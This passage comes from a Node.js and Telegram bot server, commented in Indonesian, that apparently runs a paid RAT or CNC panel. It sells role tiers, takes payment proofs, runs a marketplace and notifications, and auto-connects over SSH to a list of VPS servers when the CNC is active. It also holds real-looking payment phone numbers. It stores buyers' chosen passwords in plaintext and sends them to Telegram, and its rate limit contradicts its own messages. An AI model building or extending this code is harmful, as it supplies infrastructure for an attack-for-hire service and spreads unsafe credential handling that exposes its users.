    saveStoreUang(storeUang);

    // ── Notif Telegram ke admin ──
    try {
  const methodLabel = paymentMethod === 'qris' ? '🟪 QRIS' : '🔵 DANA';

  await bot.sendPhoto(
    RAT_NOTIF_ADMIN_ID,
    fs.createReadStream(proofFile),
    {
      caption: `💰 *STORE UANG BARU*\n\n` +
               `🆔 ID: \`${storeId}\`\n` +
               `👤 Nama: \`${namaPanggilan}\`\n` +
               `🎮 Akun: \`${namaAkun}\`\n` +
               `💵 Jumlah: *Rp ${amount.toLocaleString('id-ID')}*\n` +
               `💳 Metode: ${methodLabel}\n\n` +
               `Tekan tombol untuk konfirmasi.`,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '✅ Konfirmasi Store Uang', callback_data: `confirm_store:${storeId}`, style: 'success' }],
        ],
      },
    }
  );
} catch (e) {
  console.error('[NOTIF STORE] Gagal:', e.message);
}

    console.log(`[STORE] ${storeId} dari ${username} (${namaPanggilan}): Rp ${amount} via ${paymentMethod}`);

    res.json({
      valid: true,
      message: 'Store uang terkirim. Terima kasih!',
      storeId,
    });
  } catch (err) {
    console.error('[STORE ERROR]', err);
    res.status(500).json({ valid: false, message: err.message });
  }
});

// ── GET /store-uang-list — List store uang (buat admin) ──
app.get('/store-uang-list', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false });

  const allowedRoles = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin'];
  if (!allowedRoles.includes((user.role || '').toLowerCase())) {
    return res.status(403).json({ valid: false, message: 'Ga punya akses' });
  }

  const storeUang = loadStoreUang();
  storeUang.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  const total = storeUang.reduce((sum, d) => sum + (d.amount || 0), 0);

  res.json({ valid: true, storeUang, total });
});

// ══════ BOT COMMANDS — STORE UANG ══════

bot.onText(/^\/storeuang$/i, (msg) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const storeUang = loadStoreUang();

  if (storeUang.length === 0) {
    return bot.sendMessage(chat, '📭 Belum ada store uang.');
  }

  const total = storeUang.reduce((sum, d) => sum + (d.amount || 0), 0);

  const recent = storeUang
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
    .slice(0, 10);

  const lines = recent.map(d =>
    `🆔 \`${d.id}\`\n` +
    `👤 ${d.username}\n` +
    `💵 *Rp ${d.amount.toLocaleString('id-ID')}*\n` +
    (d.message ? `💬 _${d.message}_\n` : '') +
    `📎 ${d.proofUrl}`
  ).join('\n\n─────────────\n\n');

  bot.sendMessage(
    chat,
    `💰 *STORE UANG MASUK*\n\n` +
    `📊 Total: *Rp ${total.toLocaleString('id-ID')}*\n` +
    `📝 Jumlah: *${storeUang.length}*\n\n` +
    `*10 Terbaru:*\n\n${lines}`,
    { parse_mode: 'Markdown' }
  );
});

bot.onText(/^\/totalstoreuang$/i, (msg) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const storeUang = loadStoreUang();
  const total = storeUang.reduce((sum, d) => sum + (d.amount || 0), 0);

  bot.sendMessage(
    chat,
    `💰 *TOTAL STORE UANG*\n\n` +
    `💵 Total: *Rp ${total.toLocaleString('id-ID')}*\n` +
    `👥 User: *${storeUang.length} orang*`,
    { parse_mode: 'Markdown' }
  );
});

console.log('[STORE UANG] System ready: POST /store-uang, GET /store-uang-list');
console.log('[STORE UANG] Bot: /storeuang, /totalstoreuang');


// ══════════════════════════════════════════════════════════════
// ══════ BUY ACCESS SYSTEM — SELF SERVICE ══════
// ══════════════════════════════════════════════════════════════

const BUY_ACCESS_FILE = path.join(__dirname, 'buy_access_requests.json');

const BUY_ACCESS_ROLES = [
  { id: 'member',     name: 'MEMBER',     emoji: '👤', price: 20000,  durationDays: 30 },
  { id: 'reseller',   name: 'RESELLER',   emoji: '🛒', price: 25000,  durationDays: 30 },
  { id: 'vip',        name: 'VIP',        emoji: '⭐', price: 30000,  durationDays: 30 },
  { id: 'admin',      name: 'ADMIN',      emoji: '🛡️', price: 35000,  durationDays: 30 },
  { id: 'partner',    name: 'PARTNER',    emoji: '🤝', price: 45000,  durationDays: 30 },
  { id: 'moderator',  name: 'MODERATOR',  emoji: '🔴', price: 55000,  durationDays: 30 },
  { id: 'owner',      name: 'OWNER',      emoji: '👑', price: 80000,  durationDays: 30 },
  { id: 'high owner', name: 'HIGH OWNER', emoji: '💎', price: 120000, durationDays: 30 },
  { id: 'developer',  name: 'DEVELOPER',  emoji: '⚡', price: 200000, durationDays: 30 },
];

const ADMIN_PAYMENT_INFO = {
  dana: { number: '083890054086', name: 'Really xxxx' },
  gopay: { number: '083895691477', name: 'Thufail xxxx' },
};

function loadBuyAccessRequests() {
  try {
    if (!fs.existsSync(BUY_ACCESS_FILE)) return [];
    return JSON.parse(fs.readFileSync(BUY_ACCESS_FILE, 'utf8'));
  } catch { return []; }
}

function saveBuyAccessRequests(data) {
  fs.writeFileSync(BUY_ACCESS_FILE, JSON.stringify(data, null, 2));
}

function generateUsername(role) {
  const prefix = {
    'member': 'mbr', 'reseller': 'rsl', 'vip': 'vip', 'admin': 'adm',
    'partner': 'ptn', 'moderator': 'mod', 'owner': 'own',
    'high owner': 'how', 'developer': 'dev'
  }[role] || 'usr';
  const rand = crypto.randomBytes(3).toString('hex');
  return `${prefix}${rand}`;
}

function generatePassword() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789';
  let pass = '';
  for (let i = 0; i < 8; i++) {
    pass += chars[Math.floor(Math.random() * chars.length)];
  }
  return pass;
}

// ── GET /buy-access/roles ──
app.get('/buy-access/roles', (req, res) => {
  res.json({
    valid: true,
    roles: BUY_ACCESS_ROLES,
    payment: ADMIN_PAYMENT_INFO,
  });
});

// ── POST /buy-access/submit ──
// ── POST /buy-access/submit ──
app.post('/buy-access/submit', async (req, res) => {
  try {
    const parts = await parseMultipart(req);

    let namaUser = null, noWa = null, telegramUser = null;
    let usernameBeli = null, passwordBeli = null;
    let roleTarget = null, price = 0, durationDays = 30;
    let paymentMethod = 'qris'; // default
    let proofFile = null, proofFilename = null;

    for (const part of parts) {
      if (part.name === 'nama')          namaUser = part.data.toString().trim();
      if (part.name === 'whatsapp')      noWa = part.data.toString().trim();
      if (part.name === 'telegram')      telegramUser = part.data.toString().trim();
      if (part.name === 'username')      usernameBeli = part.data.toString().trim();
      if (part.name === 'password')      passwordBeli = part.data.toString().trim();
      if (part.name === 'role')          roleTarget = part.data.toString().trim().toLowerCase();
      if (part.name === 'price')         price = parseInt(part.data.toString()) || 0;
      if (part.name === 'duration')      durationDays = parseInt(part.data.toString()) || 30;
      if (part.name === 'paymentMethod') paymentMethod = part.data.toString().trim().toLowerCase();

      if (part.name === 'proof' && part.filename) {
        const ext = (path.extname(part.filename) || '.jpg').toLowerCase();
        const allowedExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.heic', '.heif'];
        if (!allowedExts.includes(ext)) {
          return res.status(400).json({ valid: false, message: 'Format file tidak didukung' });
        }
        if (part.data.length > 10 * 1024 * 1024) {
          return res.status(400).json({ valid: false, message: 'Max 10MB' });
        }
        proofFilename = `buy_${Date.now()}_${Math.random().toString(36).slice(2, 8)}${ext}`;
        proofFile = path.join(UPLOAD_DIR, proofFilename);
        fs.writeFileSync(proofFile, part.data);
      }
    }

    // Validasi
    if (!namaUser || !noWa || !telegramUser || !roleTarget || !proofFile) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Data tidak lengkap' });
    }

    if (!usernameBeli || usernameBeli.length < 3) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Username akun minimal 3 karakter' });
    }

    if (!passwordBeli || passwordBeli.length < 3) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Password minimal 3 karakter' });
    }

    const roleInfo = BUY_ACCESS_ROLES.find(r => r.id === roleTarget);
    if (!roleInfo) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Role tidak valid' });
    }

    const requests = loadBuyAccessRequests();
    const existing = requests.find(r =>
      r.nama.toLowerCase() === namaUser.toLowerCase() && r.status === 'pending'
    );
    if (existing) {
      if (proofFile) { try { fs.unlinkSync(proofFile); } catch (_) {} }
      return res.status(429).json({ valid: false, message: 'Masih ada request pending dengan nama ini.' });
    }

    const requestId = 'BUY-' + Date.now().toString(36).toUpperCase();
    const request = {
      id: requestId,
      nama: namaUser,
      whatsapp: noWa,
      telegram: telegramUser,
      username: usernameBeli,
      password: passwordBeli,
      role: roleTarget,
      roleName: roleInfo.name,
      price: roleInfo.price,
      durationDays: durationDays,
      paymentMethod: paymentMethod,
      proofFile: proofFilename,
      proofUrl: `/uploads/proofs/${proofFilename}`,
      status: 'pending',
      createdAt: new Date().toISOString(),
      approvedAt: null,
      approvedBy: null,
      generatedUsername: null,
      generatedPassword: null,
    };

    requests.push(request);
    saveBuyAccessRequests(requests);

    // ── Notif Telegram ke owner ──
    try {
      const methodLabel = paymentMethod === 'qris' ? '🟪 QRIS' : '🔵 DANA';

      await bot.sendPhoto(
        RAT_NOTIF_ADMIN_ID,
        fs.createReadStream(proofFile),
        {
          caption:
            `🛒 *PEMBELIAN AKUN BARU*\n\n` +
            `🆔 ID: \`${requestId}\`\n` +
            `━━━━━━━━━━━━━━━━\n` +
            `👤 Nama: \`${namaUser}\`\n` +
            `📱 WhatsApp: \`${noWa}\`\n` +
            `✈️ Telegram: \`${telegramUser}\`\n` +
            `━━━━━━━━━━━━━━━━\n` +
            `🎯 Role: *${roleInfo.emoji} ${roleInfo.name}*\n` +
            `💰 Harga: *Rp ${roleInfo.price.toLocaleString('id-ID')}*\n` +
            `💳 Metode: ${methodLabel}\n` +
            `⏳ Durasi: ${durationDays} hari\n` +
            `━━━━━━━━━━━━━━━━\n` +
            `🔐 *DATA AKUN YANG DIMINTA:*\n` +
            `👤 Username: \`${usernameBeli}\`\n` +
            `🔑 Password: \`${passwordBeli}\`\n\n` +
            `Tekan tombol untuk konfirmasi.`,
          parse_mode: 'Markdown',
          reply_markup: {
  inline_keyboard: [
    [{ text: '✅ Approve & Buat Akun', callback_data: `buy_approve:${requestId}`, style: 'success' }],
    [{ text: '❌ Reject', callback_data: `buy_reject:${requestId}`, style: 'danger' }],
  ],
},
        }
      );
    } catch (e) {
      console.error('[NOTIF BUY] Gagal kirim:', e.message);
    }

    console.log(`[BUY ACCESS] Request ${requestId} dari ${namaUser} (${roleTarget})`);
    res.json({ valid: true, message: 'Request berhasil dikirim.', requestId });
  } catch (err) {
    console.error('[BUY ACCESS ERROR]', err);
    res.status(500).json({ valid: false, message: err.message });
  }
});

// ── GET /buy-access/status/:id ──
app.get('/buy-access/status/:id', (req, res) => {
  const requests = loadBuyAccessRequests();
  const request = requests.find(r => r.id === req.params.id);
  if (!request) {
    return res.status(404).json({ valid: false, message: 'Request tidak ditemukan' });
  }
  res.json({
    valid: true,
    request: {
      id: request.id,
      status: request.status,
      role: request.role,
      roleName: request.roleName,
      price: request.price,
      createdAt: request.createdAt,
      approvedAt: request.approvedAt,
      username: request.status === 'approved' ? request.generatedUsername : null,
      password: request.status === 'approved' ? request.generatedPassword : null,
    },
  });
});

console.log('[BUY ACCESS] System ready: /buy-access/roles, /buy-access/submit, /buy-access/status/:id');


// ══════ BOT COMMAND: /pendingbuy ══════
bot.onText(/^\/pendingbuy$/i, (msg) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const requests = loadBuyAccessRequests();
  const pending = requests.filter(r => r.status === 'pending');

  if (pending.length === 0) {
    return bot.sendMessage(chat, '📭 Belum ada request pembelian pending.');
  }

  const lines = pending.map(r => {
    return `🆔 \`${r.id}\`\n` +
           `👤 ${r.nama} (${r.whatsapp})\n` +
           `🎯 ${r.roleName} — Rp ${r.price.toLocaleString('id-ID')}\n` +
           `📎 ${r.proofUrl}`;
  }).join('\n\n─────────────\n\n');

  bot.sendMessage(
    chat,
    `🛒 *PENDING BUY ACCESS (${pending.length})*\n\n${lines}`,
    { parse_mode: 'Markdown' }
  );
});

// ══════ BOT COMMAND: /listbuy ══════
bot.onText(/^\/listbuy$/i, (msg) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const requests = loadBuyAccessRequests();
  if (requests.length === 0) {
    return bot.sendMessage(chat, '📭 Belum ada request pembelian sama sekali.');
  }

  const recent = requests
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
    .slice(0, 10);

  const lines = recent.map(r => {
    const emoji = r.status === 'approved' ? '✅' : r.status === 'rejected' ? '❌' : '⏳';
    return `${emoji} \`${r.id}\`\n` +
           `👤 ${r.nama}\n` +
           `🎯 ${r.roleName}\n` +
           `📊 Status: ${r.status.toUpperCase()}`;
  }).join('\n\n─────────────\n\n');

  bot.sendMessage(
    chat,
    `🛒 *10 REQUEST TERBARU*\n\n${lines}`,
    { parse_mode: 'Markdown' }
  );
});

console.log('[BUY ACCESS] Bot commands: /pendingbuy, /listbuy');

// ══════════════════════════════════════════════════════════════
// ══════ PASAR ONLINE (MARKETPLACE) ══════
// ══════════════════════════════════════════════════════════════
// User bisa jual produk & liat produk user lain

const MARKET_FILE = path.join(__dirname, 'market_products.json');

// Folder upload produk
const PRODUCT_UPLOAD_DIR = path.join(__dirname, 'uploads', 'products');
if (!fs.existsSync(PRODUCT_UPLOAD_DIR)) {
  fs.mkdirSync(PRODUCT_UPLOAD_DIR, { recursive: true });
  console.log('[MARKET] Folder uploads/products dibuat.');
}

function loadMarketProducts() {
  try {
    if (!fs.existsSync(MARKET_FILE)) return [];
    return JSON.parse(fs.readFileSync(MARKET_FILE, 'utf8'));
  } catch { return []; }
}

function saveMarketProducts(data) {
  fs.writeFileSync(MARKET_FILE, JSON.stringify(data, null, 2));
}

// ── GET /market/products — List semua produk ──
app.get('/market/products', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  try {
    let products = loadMarketProducts();

    // Sort by newest
    products.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

    // Filter kategori (opsional)
    const kategori = (req.query.kategori || '').toLowerCase();
    if (kategori && kategori !== 'semua') {
      products = products.filter(p => p.kategori.toLowerCase() === kategori);
    }

    // Search (opsional)
    const q = (req.query.q || '').toLowerCase();
    if (q) {
      products = products.filter(p =>
        p.nama.toLowerCase().includes(q) ||
        p.deskripsi.toLowerCase().includes(q)
      );
    }

    // Tambahin flag "isMine"
    const username = keyInfo.username;
    products = products.map(p => ({
      ...p,
      isMine: p.penjual === username,
    }));

    res.json({ valid: true, products });
  } catch (e) {
    console.error('[MARKET LIST ERROR]', e.message);
    res.status(500).json({ valid: false, message: e.message });
  }
});

// ── GET /market/products/:id — Detail 1 produk ──
app.get('/market/products/:id', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  try {
    const products = loadMarketProducts();
    const product = products.find(p => p.id === req.params.id);
    if (!product) {
      return res.status(404).json({ valid: false, message: 'Produk tidak ditemukan' });
    }

    res.json({
      valid: true,
      product: {
        ...product,
        isMine: product.penjual === keyInfo.username,
      },
    });
  } catch (e) {
    res.status(500).json({ valid: false, message: e.message });
  }
});

// ── POST /market/products — Tambah produk baru ──
app.post('/market/products', async (req, res) => {
  try {
    const parts = await parseMultipart(req);

    let sessionKey = null;
    let nama = '';
    let harga = 0;
    let deskripsi = '';
    let kategori = 'Lainnya';
    let wa = '';
    let telegram = '';
    let fotoFile = null;
    let fotoFilename = null;

    for (const part of parts) {
      if (part.name === 'sessionKey') sessionKey = part.data.toString().trim();
      if (part.name === 'nama') nama = part.data.toString().trim().slice(0, 100);
      if (part.name === 'harga') harga = parseInt(part.data.toString()) || 0;
      if (part.name === 'deskripsi') deskripsi = part.data.toString().trim().slice(0, 500);
      if (part.name === 'kategori') kategori = part.data.toString().trim();
      if (part.name === 'wa') wa = part.data.toString().trim();
      if (part.name === 'telegram') telegram = part.data.toString().trim();

      if (part.name === 'foto' && part.filename) {
        const ext = (path.extname(part.filename) || '.jpg').toLowerCase();
        const allowedExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.heic', '.heif'];

        if (!allowedExts.includes(ext)) {
          return res.status(400).json({ valid: false, message: 'Format foto tidak didukung' });
        }
        if (part.data.length > 5 * 1024 * 1024) {
          return res.status(400).json({ valid: false, message: 'Foto max 5MB' });
        }

        fotoFilename = `prod_${Date.now()}_${Math.random().toString(36).slice(2, 8)}${ext}`;
        fotoFile = path.join(PRODUCT_UPLOAD_DIR, fotoFilename);
        fs.writeFileSync(fotoFile, part.data);
      }
    }

    // Validasi
    if (!sessionKey) {
      if (fotoFile) { try { fs.unlinkSync(fotoFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Session tidak valid' });
    }

    const keyInfo = activeKeys[sessionKey];
    if (!keyInfo) {
      if (fotoFile) { try { fs.unlinkSync(fotoFile); } catch (_) {} }
      return res.status(401).json({ valid: false, message: 'Session tidak valid' });
    }

    if (!nama || nama.length < 3) {
      if (fotoFile) { try { fs.unlinkSync(fotoFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Nama produk minimal 3 karakter' });
    }

    if (harga < 1000) {
      if (fotoFile) { try { fs.unlinkSync(fotoFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Harga minimal Rp 1.000' });
    }

    if (!fotoFile) {
      return res.status(400).json({ valid: false, message: 'Foto produk wajib diupload' });
    }

    const username = keyInfo.username;
    const products = loadMarketProducts();

    // Batasi max 20 produk per user
    const userProducts = products.filter(p => p.penjual === username);
    if (userProducts.length >= 20) {
      if (fotoFile) { try { fs.unlinkSync(fotoFile); } catch (_) {} }
      return res.status(400).json({ valid: false, message: 'Max 20 produk per user. Hapus produk lama dulu.' });
    }

    const productId = 'PRD-' + Date.now().toString(36).toUpperCase();
    const product = {
      id: productId,
      nama,
      harga,
      deskripsi,
      kategori,
      penjual: username,
      wa,
      telegram,
      foto: fotoFilename,
      fotoUrl: `/uploads/products/${fotoFilename}`,
      createdAt: new Date().toISOString(),
    };

    products.push(product);
    saveMarketProducts(products);

    console.log(`[MARKET] Produk baru: ${nama} (Rp ${harga}) oleh ${username}`);

    res.json({ valid: true, message: 'Produk berhasil dipasang', productId });
  } catch (err) {
    console.error('[MARKET ADD ERROR]', err);
    res.status(500).json({ valid: false, message: err.message });
  }
});

// ── DELETE /market/products/:id — Hapus produk ──
app.delete('/market/products/:id', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  try {
    const products = loadMarketProducts();
    const idx = products.findIndex(p => p.id === req.params.id);
    if (idx === -1) {
      return res.status(404).json({ valid: false, message: 'Produk tidak ditemukan' });
    }

    const product = products[idx];
    const userRole = getAccountRole(keyInfo.username);

    // Cuma owner atau admin+ yang bisa hapus
    const isOwner = product.penjual === keyInfo.username;
    const isAdmin = ['admin', 'moderator', 'owner', 'high owner', 'developer'].includes(userRole);

    if (!isOwner && !isAdmin) {
      return res.status(403).json({ valid: false, message: 'Ga bisa hapus produk orang lain' });
    }

    // Hapus file foto
    if (product.foto) {
      const fotoPath = path.join(PRODUCT_UPLOAD_DIR, product.foto);
      if (fs.existsSync(fotoPath)) {
        try { fs.unlinkSync(fotoPath); } catch (_) {}
      }
    }

    products.splice(idx, 1);
    saveMarketProducts(products);

    console.log(`[MARKET] Produk dihapus: ${product.nama} oleh ${keyInfo.username}`);
    res.json({ valid: true, message: 'Produk berhasil dihapus' });
  } catch (e) {
    res.status(500).json({ valid: false, message: e.message });
  }
});

// ── GET /market/my-products — Produk sendiri ──
app.get('/market/my-products', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  try {
    const products = loadMarketProducts();
    const myProducts = products
      .filter(p => p.penjual === keyInfo.username)
      .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

    res.json({ valid: true, products: myProducts });
  } catch (e) {
    res.status(500).json({ valid: false, message: e.message });
  }
});

console.log('[MARKET] Endpoint terpasang: /market/products, /market/my-products');

// ══════════════════════════════════════════════════════════════
// ══════ NOTIFIKASI / BROADCAST INBOX SYSTEM ══════
// ══════════════════════════════════════════════════════════════

const NOTIF_FILE = path.join(__dirname, 'notifications.json');

function loadNotifications() {
  try {
    if (!fs.existsSync(NOTIF_FILE)) return [];
    return JSON.parse(fs.readFileSync(NOTIF_FILE, 'utf8'));
  } catch { return []; }
}

function saveNotifications(data) {
  fs.writeFileSync(NOTIF_FILE, JSON.stringify(data, null, 2));
}

// Auto-create notif sambutan
if (!fs.existsSync(NOTIF_FILE)) {
  saveNotifications([{
    id: 'NTF-WELCOME',
    title: 'Selamat Datang',
    body: 'Halaman notifikasi sudah aktif, bro. Gaskeun!',
    type: 'success',
    from: 'SYSTEM',
    to: 'all',
    created_at: new Date().toISOString(),
    readBy: [],
    deletedBy: [],
  }]);
  console.log('[NOTIF] File notifications.json dibuat + notif sambutan.');
}

// ── GET /getNotifications ──
app.get('/getNotifications', (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  try {
    const all = loadNotifications();
    const mine = all
      .filter(n => n.to === 'all' || n.to === username)
      .filter(n => !(n.deletedBy || []).includes(username))
      .map(n => ({
        ...n,
        is_read: (n.readBy || []).includes(username),
      }))
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));

    res.json({ valid: true, notifications: mine });
  } catch (e) {
    console.error('[NOTIF GET]', e.message);
    res.status(500).json({ valid: false, message: e.message });
  }
});

// ── POST /markNotificationRead ──
app.post('/markNotificationRead', (req, res) => {
  const { key, username, id } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  try {
    const all = loadNotifications();
    const idx = all.findIndex(n => n.id === id);
    if (idx === -1) return res.status(404).json({ valid: false, message: 'Notif ga ketemu' });

    if (!all[idx].readBy) all[idx].readBy = [];
    if (!all[idx].readBy.includes(username)) all[idx].readBy.push(username);

    saveNotifications(all);
    res.json({ valid: true });
  } catch (e) {
    res.status(500).json({ valid: false, message: e.message });
  }
});

// ── POST /markAllRead ──
app.post('/markAllRead', (req, res) => {
  const { key, username } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  try {
    const all = loadNotifications();
    all.forEach(n => {
      if (n.to === 'all' || n.to === username) {
        if (!n.readBy) n.readBy = [];
        if (!n.readBy.includes(username)) n.readBy.push(username);
      }
    });
    saveNotifications(all);
    res.json({ valid: true });
  } catch (e) {
    res.status(500).json({ valid: false, message: e.message });
  }
});

// ── POST /deleteNotification ──
app.post('/deleteNotification', (req, res) => {
  const { key, username, id } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  try {
    const all = loadNotifications();
    const idx = all.findIndex(n => n.id === id);
    if (idx === -1) return res.status(404).json({ valid: false, message: 'Notif ga ketemu' });

    if (!all[idx].deletedBy) all[idx].deletedBy = [];
    if (!all[idx].deletedBy.includes(username)) all[idx].deletedBy.push(username);

    saveNotifications(all);
    res.json({ valid: true });
  } catch (e) {
    res.status(500).json({ valid: false, message: e.message });
  }
});

// ── POST /broadcast ──
app.post('/broadcast', (req, res) => {
  const { key, title, body, type, to } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  const allowed = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin'];
  if (!user || !allowed.includes((user.role || '').toLowerCase())) {
    return res.status(403).json({ valid: false, message: 'Ga punya akses' });
  }

  try {
    const all = loadNotifications();
    const notif = {
      id: 'NTF-' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 5).toUpperCase(),
      title: title || 'Broadcast',
      body: body || '',
      type: (type || 'info').toLowerCase(),
      from: keyInfo.username,
      to: to || 'all',
      created_at: new Date().toISOString(),
      readBy: [],
      deletedBy: [],
    };
    all.push(notif);
    saveNotifications(all);

    console.log(`[BROADCAST] ${notif.id} dari ${keyInfo.username} → ${notif.to}`);
    res.json({ valid: true, id: notif.id });
  } catch (e) {
    res.status(500).json({ valid: false, message: e.message });
  }
});

console.log('[NOTIF] Endpoint terpasang: /getNotifications, /markNotificationRead, /markAllRead, /deleteNotification, /broadcast');

// ══════════════════════════════════════════════════════════════
// ══════ FIX: ENDPOINT NOTIFICATION (BIAR GA ERROR 404) ══════
// ══════════════════════════════════════════════════════════════
app.post('/notify/send', (req, res) => {
  const { key, title, message, type } = req.body;
  const keyInfo = activeKeys[key];

  // 1. Validasi session key
  if (!keyInfo) {
    return res.status(401).json({ 
      success: false, 
      error: 'SESSION EXPIRED' 
    });
  }

  // 2. Ambil data user & cek role
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  const allowedRoles = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin'];
  if (!user || !allowedRoles.includes((user.role || 'member').toLowerCase())) {
    return res.status(403).json({ 
      success: false, 
      error: 'ACCESS DENIED' 
    });
  }

  // 3. Validasi input
  if (!title || !message) {
    return res.status(400).json({ 
      success: false, 
      error: 'TITLE & MESSAGE REQUIRED' 
    });
  }

  try {
    // 4. Simpan notifikasi ke file
    const all = loadNotifications();
    const notif = {
      id: 'NTF-' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 5).toUpperCase(),
      title: title,
      body: message,
      type: (type || 'info').toLowerCase(),
      from: keyInfo.username,
      to: 'all',
      created_at: new Date().toISOString(),
      readBy: [],
      deletedBy: [],
    };
    all.push(notif);
    saveNotifications(all);

    console.log(`[NOTIFY] Notif terkirim: ${notif.id} oleh ${keyInfo.username}`);
    
    // 5. Balas sukses ke Flutter
    res.json({ 
      success: true, 
      id: notif.id 
    });

  } catch (err) {
    console.error('[NOTIFY ERROR]', err);
    res.status(500).json({ 
      success: false, 
      error: err.message 
    });
  }
});

console.log('[NOTIFY] Endpoint terpasang: POST /notify/send');

// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type, Accept");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
